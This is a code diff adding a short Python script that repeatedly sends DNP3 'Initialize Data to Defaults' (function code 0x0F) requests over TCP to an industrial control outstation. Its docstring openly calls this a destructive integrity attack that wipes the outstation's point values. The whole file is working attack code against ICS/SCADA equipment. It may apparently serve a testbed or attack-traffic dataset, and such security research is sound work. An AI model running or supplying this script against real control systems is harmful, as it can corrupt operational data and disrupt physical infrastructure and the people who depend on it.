@@ -1,0 +1,24 @@
+"""INIT_DATA — FC 0x0F (Initialize Data to Defaults).
+
+Wipes outstation point values back to defaults — destructive integrity attack.
+"""
+import argparse, time
+from dnp3 import app_request, send_tcp, now
+from config import OUTSTATION_IP, OUTSTATION_PORT, OUTSTATION_ADDR, MASTER_ADDR
+
+def main():
+    p = argparse.ArgumentParser()
+    p.add_argument("--host", default=OUTSTATION_IP)
+    p.add_argument("--port", type=int, default=OUTSTATION_PORT)
+    p.add_argument("--count", type=int, default=10)
+    p.add_argument("--interval", type=float, default=2.0)
+    a = p.parse_args()
+    print(f"[{now()}] INIT_DATA start x{a.count}")
+    for i in range(a.count):
+        send_tcp(app_request(MASTER_ADDR, OUTSTATION_ADDR, 0x0F, b"", seq=i & 0x0F),
+                 a.host, a.port)
+        time.sleep(a.interval)
+    print(f"[{now()}] INIT_DATA stop")
+
+if __name__ == "__main__":
+    main()
